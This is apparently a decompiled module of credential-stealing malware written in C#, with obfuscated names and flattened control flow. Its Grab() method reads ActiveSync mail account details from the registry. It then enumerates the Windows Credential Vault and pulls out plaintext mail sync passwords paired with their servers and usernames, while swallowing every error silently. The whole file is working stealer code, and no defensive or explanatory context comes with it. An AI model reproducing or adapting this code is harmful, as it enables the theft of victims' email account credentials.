using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using p3N5Y;
using ppkr;

namespace ZAZUx;

public class gIIYDC0SR : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string _9u3aPfV570x
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public gIIYDC0SR()
	{
		_9u3aPfV570x = "Windows Mail App";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			switch (num)
			{
			case 3:
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\ActiveSync\\Partners");
					if (registryKey == null)
					{
						return list;
					}
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string text in subKeyNames)
					{
						using RegistryKey registryKey2 = registryKey.OpenSubKey(text);
						if (registryKey2 == null)
						{
							continue;
						}
						string username = (string)registryKey2.GetValue("Email");
						string host = (string)registryKey2.GetValue("Server");
						Version version = Environment.OSVersion.Version;
						int major = version.Major;
						int minor = version.Minor;
						Type type = ((major < 6 || minor < 2) ? typeof(gVe3wBP.EFrFq) : typeof(gVe3wBP._06ZbC));
						int vaultCount = 0;
						IntPtr vaultGuid = IntPtr.Zero;
						int value = gVe3wBP.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuid);
						if (Convert.ToInt32(value) != 0)
						{
							continue;
						}
						IntPtr ptr = vaultGuid;
						for (int j = 0; j <= vaultCount - 1; j++)
						{
							object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
							Guid vaultGuid2 = new Guid(obj.ToString());
							ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
							IntPtr vaultHandle = IntPtr.Zero;
							if (gVe3wBP.VaultOpenVault(ref vaultGuid2, 0u, ref vaultHandle) != 0)
							{
								continue;
							}
							int vaultItemCount = 0;
							IntPtr vaultItem = IntPtr.Zero;
							value = gVe3wBP.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItem);
							if (value != 0)
							{
								continue;
							}
							IntPtr ptr2 = vaultItem;
							if (vaultItemCount <= 0)
							{
								continue;
							}
							for (int k = 1; k <= vaultItemCount; k++)
							{
								try
								{
									object obj2 = Marshal.PtrToStructure(ptr2, type);
									ptr2 = ((IntPtr.Size != 8) ? new IntPtr(ptr2.ToInt32() + Marshal.SizeOf(type) - 8) : new IntPtr(ptr2.ToInt64() + Marshal.SizeOf(type)));
									IntPtr passwordVaultPtr = IntPtr.Zero;
									FieldInfo field = obj2.GetType().GetField("SchemaId");
									Guid schemaId = new Guid(field.GetValue(obj2).ToString());
									FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
									IntPtr intPtr = (IntPtr)field2.GetValue(obj2);
									FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
									IntPtr intPtr2 = (IntPtr)field3.GetValue(obj2);
									IntPtr zero = IntPtr.Zero;
									if (major >= 6 && minor >= 2)
									{
										FieldInfo field4 = obj2.GetType().GetField("pPackageSid");
										zero = (IntPtr)field4.GetValue(obj2);
										value = gVe3wBP.VaultGetItem_WIN8(vaultHandle, ref schemaId, intPtr, intPtr2, zero, IntPtr.Zero, 0, ref passwordVaultPtr);
									}
									if (value != 0)
									{
										continue;
									}
									object obj3 = Marshal.PtrToStructure(passwordVaultPtr, type);
									FieldInfo field5 = obj3.GetType().GetField("pAuthenticatorElement");
									IntPtr bXGeD = (IntPtr)field5.GetValue(obj3);
									object obj4 = gVe3wBP.LcWKH6Lg(bXGeD);
									if (obj4 != null)
									{
										string text2 = (string)gVe3wBP.LcWKH6Lg(intPtr);
										if (text2.ToLower().StartsWith("syncpassword") && text2.Contains(text) && text2.ToLower().Contains("mailoutgoing"))
										{
											_ = (string)gVe3wBP.LcWKH6Lg(intPtr2);
											string password = (string)obj4;
											ii68 ii69 = new ii68();
											ii69.byIdLuuGZbL = host;
											ii69.S8v = username;
											ii69._9H5rP7hg2 = password;
											ii69.oVAe = _9u3aPfV570x;
											list.Add(ii69);
										}
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
				return list;
			case 1:
				Environment.SetEnvironmentVariable("COMPlus_legacyCorruptedStateExceptionsPolicy", "1");
				num = 2;
				break;
			}
			if (num == 2)
			{
				list = new List<ii68>();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		List<ii68> result = default;
		return result;
	}
}
